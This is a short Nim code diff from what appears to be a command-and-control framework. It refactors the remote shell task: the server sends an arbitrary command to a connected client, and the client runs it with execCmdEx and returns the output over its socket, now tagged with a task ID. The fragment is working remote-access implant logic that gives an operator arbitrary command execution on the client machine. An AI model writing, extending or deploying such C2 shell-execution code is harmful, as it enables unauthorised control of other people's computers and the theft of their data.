@@ -7,18 +7,16 @@ when defined(client):
     import ../client/communication
 
 when defined(server):
-    proc sendTask*(client: C2Client, cmd: string) {.async.} =
-        let j = %*
+    proc sendTask*(client: C2Client, cmd: string): Future[Task] {.async.} =
+        return await client.sendClientTask("shell", %*
             {
-                "task": "shell",
                 "shellCmd": cmd
-            }
-        await client.sendClientTask($j)
+            })
 
 when defined(client):
-    proc executeTask*(socket: Socket, toExec: string) =
+    proc executeTask*(socket: Socket, taskId: int, toExec: string) =
         try:
             let (output, _) = execCmdEx(toExec, workingDir = getCurrentDir())
-            socket.sendOutput("CMD", output)
+            socket.sendOutput(taskId, "CMD", output)
         except OSError:
-            socket.sendOutput("CMD", getCurrentExceptionMsg())
+            socket.sendOutput(taskId, "CMD", "", getCurrentExceptionMsg())
